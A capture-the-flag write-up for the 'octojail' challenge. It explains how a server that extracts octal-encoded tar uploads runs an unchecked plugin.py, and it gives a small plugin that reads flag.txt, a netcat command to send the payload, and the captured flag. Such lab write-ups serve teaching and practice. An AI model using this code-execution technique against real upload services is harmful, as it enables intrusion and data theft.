# octojail

![Proof](proof.png)

**Author:** `thek0der`  
**Solves:** 85

**writeup made by** `vlad`
---

## Description

We only like octal around here!

We get the `main.py` file.

---

## Solve

When i tried connecting to the remote it asked for a input so i decided to open the `main.py` file.

After looking in the main.py file we can see that the server expects an octal string:

```py
blob = to_bytes_from_octal_triplets(data)
```

This means that our input must be octal digits grouped into 3digit triplets each one forming a byte.

Looking further into the code we can see that the `to_bytes_from_octal_triplets` function converts our octal into raw bytes and later in the file it opens those bytes as a tar file:

```py
with tarfile.open(fileobj=bio, mode="r:*") as tf:
    safe_extract(tf, "uploads")
```

This means that the server is expecting a tar archive but encoded into a octal digits.

The script also runs a plugin.py if it exists in our archive which doesnt get filtered safely like the tar archive itself meaning that whatever we put into plugin.py in the root of our archive it will run freely.

This means that we can easily make a plugin.py containing a simple code that tries to exfiltrate flag.txt if it exists.

```py
def run():
    print(open("flag.txt").read())
```

To help with the encoding i made a small script that reads a local plugin.py and packs it into a tar archive encodes it in octal triplets and output everything to payload.txt that i can than send to the server.

After running the script using with `python3 payload.py plugin.py -o payload.txt` we get a payload.txt that we can pipe into the server using `cat .\payload.txt | nc remote-address remote-port` and after running this we get the following output:

```bash
/app/server_hard.py:22: DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives and reject files or modify their metadata. Use the filter argument to control this behavior.
  tf.extract(m, path)
Send octal
ctf{0331641fadb35abb1eb5a9640fa6156798cba4538148ceb863dfb1821ac69000}
```

### Flag: ctf{0331641fadb35abb1eb5a9640fa6156798cba4538148ceb863dfb1821ac69000}